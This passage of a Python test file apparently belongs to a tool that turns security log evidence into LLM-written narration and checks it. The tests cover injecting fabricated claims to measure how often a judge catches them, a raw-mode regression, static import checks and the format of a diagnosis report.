                           "sentences_fixed_by_repair", "judge_agreement_rate", "judge_error_count", "total_seconds"}
    # a second mode merges into the same summary file
    runner.repeat(case_out, load_hosts(prepared / "cases" / "case01"), "corruption", 2, FactNarr(), ClaimJudge(FClaimLLM()),
                  VerifyConfig(), NarratorConfig(mode="facts"))
    both = json.loads((case_out / "repeat_summary.json").read_text())
    assert {"chain", "corruption"} <= set(both) and both["corruption"]["runs"] == 2
    assert {"overall_catch_rate", "false_rejection_rate", "catch_rate_per_type"} <= set(both["corruption"]["metrics"])
    assert (case_out / "runs" / "corruption_run2" / "corruption_report.json").exists()


# ================= 8. corruption =================
def test_no_entity_claim_pool_and_three_way_split(prepared, tmp_path):
    assert len(set(FAKE_CLAIMS)) >= 8
    d = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", d)
    narr = FactNarr()
    narrate_chain(d, narr, NarratorConfig(mode="facts"))
    data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
    res = verify_chain(data, narr, ClaimJudge(FClaimLLM()), VerifyConfig())
    bases = base_sentences(res["verified"])
    assert len(bases) > 10 and all(b.fact_ids for b in bases)  # facts mode: many clean base sentences, with their fact_ids
    a = candidates(data, bases)["fabricated_claim_no_entity"]
    assert a == candidates(data, bases)["fabricated_claim_no_entity"]  # deterministic for the seed
    used = {c["text"][len(c["original_text"]):].strip() for c in a}
    assert len(used) >= 4 and used <= set(FAKE_CLAIMS)
    other = {c["text"][len(c["original_text"]):].strip() for c in candidates(data, bases, seed=7)["fabricated_claim_no_entity"]}
    assert other <= set(FAKE_CLAIMS)
    jl = FClaimLLM()
    rep = run_corruption(data, res["verified"], ClaimJudge(jl), cap=70)
    assert rep["base_sentences"] == len(bases) and rep["corrupted_samples"] == rep["overall"]["injected"] <= 70
    for t, p in rep["per_type"].items():
        assert {"caught_deterministic", "caught_judge_only", "missed", "catch_rate", "injected"} <= set(p)
        assert p["injected"] == p["caught_deterministic"] + p["caught_judge_only"] + p["caught_judge_error"] + p["missed"]
    seeds = [o for _, o in jl.calls]
    assert seeds.count(None) == seeds.count({"seed": 43}) > 0  # every judged sentence (controls included) is judged twice
    assert rep["control"]["count"] == len(bases) and rep["control"]["rejected"] == 0
    assert rep["judge_double"] is True and rep["controls_use_the_same_judge"] is True
    if rep["missed"]:
        assert all({"type", "original_text", "corrupted_text"} <= set(m) for m in rep["missed"])


# ================= 9. raw mode regression =================
def test_raw_mode_behaviour_unchanged(prepared, tmp_path):
    from evidenceweave.narrator.narrate import narrate_chain as nc
    d = tmp_path / "case01"
    shutil.copytree(prepared / "out" / "case01", d)

    class Raw:
        model, json_mode = "m", "schema"
        options = {"temperature": 0, "seed": 42, "num_ctx": 8192}

        def complete(self, system, user, options=None, schema=None, validator=None):
            first = re.search(r"(?:AUTH|NGX|WIN)-L\d+", user).group(0)
            text = json.dumps({"sentences": [{"text": "Something notable was logged.", "cites": [first]}]})
            return LLMResult(True, text, json.loads(text), 0.0)

    out = nc(d, Raw())
    assert out["prompt_version"] == "p4-v1" and out["narration_mode"] == "raw" and out["max_facts_per_stage"] is None
    assert all("facts" not in s for s in out["stages"])
    data = load_case_data(d, load_hosts(prepared / "cases" / "case01"))
    assert all(c.fact_map is None for c in data.ctxs.values())
    res = verify_chain(data, Raw(), None, VerifyConfig(max_retries=0, use_judge=False))
    assert res["verified"]["verification"]["narration_mode"] == "raw"
    assert all("facts" not in v["layer_results"] for v in res["report"]["verdicts"])
    assert "fact_coverage" not in res["report"]["summary"]


# ================= 10. static checks =================
def test_static_no_answer_key_and_no_generator_import():
    pkg = ROOT / "evidenceweave"
    for p in pkg.rglob("*.py"):
        if "generator" in p.parts:
            continue
        assert "answer_key" not in p.read_text(encoding="utf-8"), p
    for sub in ("verifier", "narrator"):
        for p in (pkg / sub).glob("*.py"):
            assert not re.search(r"(from|import)\s+[\w.]*generator", p.read_text(encoding="utf-8")), p


# ================= 11. diagnosis =================
def test_diagnosis_has_one_entry_per_failing_sentence():
    md = ROOT / "output" / "diagnosis_phase5b.md"
    inputs = ROOT / "output" / "diagnosis_inputs"
    if not md.exists() or not inputs.exists():
        pytest.skip("Part 0 artifacts are local (output/ is not committed)")
    n = 0
    for case in ("case01", "case02"):
        rep = json.loads((inputs / f"{case}_verification_report.json").read_text(encoding="utf-8"))
        n += sum(1 for v in rep["verdicts"] if v["source"] == "llm" and not v["accepted"])
    text = md.read_text(encoding="utf-8")
    assert len(re.findall(r"^### \d+\. ", text, re.M)) == n
    assert len(re.findall(r"\*\*Verdict: (?:GENUINE_NARRATOR_ERROR|VERIFIER_TOO_STRICT|PROMPT_DESIGN_PROBLEM)\*\*", text)) == n
    assert "| failure code |" in text
